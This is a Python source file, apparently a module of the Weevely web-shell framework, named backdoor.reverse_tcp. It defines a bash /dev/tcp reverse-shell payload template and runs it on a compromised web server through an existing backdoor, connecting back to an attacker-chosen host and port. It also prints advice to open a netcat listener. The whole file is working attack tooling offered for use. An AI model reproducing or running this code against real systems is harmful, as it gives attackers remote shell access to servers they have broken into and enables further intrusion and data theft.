'''
Created on 28/ago/2011

@author: norby
'''

'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module

classname = 'Reversetcp'
    
class Reversetcp(Module):
    """Send reverse TCP shell  
    :backdoor.reverse_tcp ip port 
    """
    
    
    vectors = { 
               'shell.sh' : { "/dev/tcp"       : "/bin/bash -c \'/bin/bash 0</dev/tcp/%s/%s 1>&0 2>&0\'"
                }
    
    }
    

    def __init__( self, modhandler , url, password):


        Module.__init__(self, modhandler, url, password)
        
        self.usersinfo = {}  
                
    def run(self, host, port):
                
        print "[backdoor.reverse_tcp] Weevely should now block during reverse backdoor usage. If not, assure"
        print "[backdoor.reverse_tcp] \'shell.sh\' is available and port is open (use \'nc -v -l -p %s\')" % (port)
        
        interpreter, vector = self._get_default_vector()
        if interpreter and vector:
            return self.__execute_payload(interpreter, vector, host, port)
            
        else:
            for interpreter in self.vectors:
                if interpreter in self.modhandler.loaded_shells:
                    for vector in self.vectors[interpreter]:
                        response = self.__execute_payload(interpreter, vector, host, port)
                        if response:
                            return response

        

    def __execute_payload(self, interpreter, vector, host, port):
        
        payload = self.vectors[interpreter][vector] % (host, port)
        return self.modhandler.load(interpreter).run(payload, False)
        
#        


    
    
    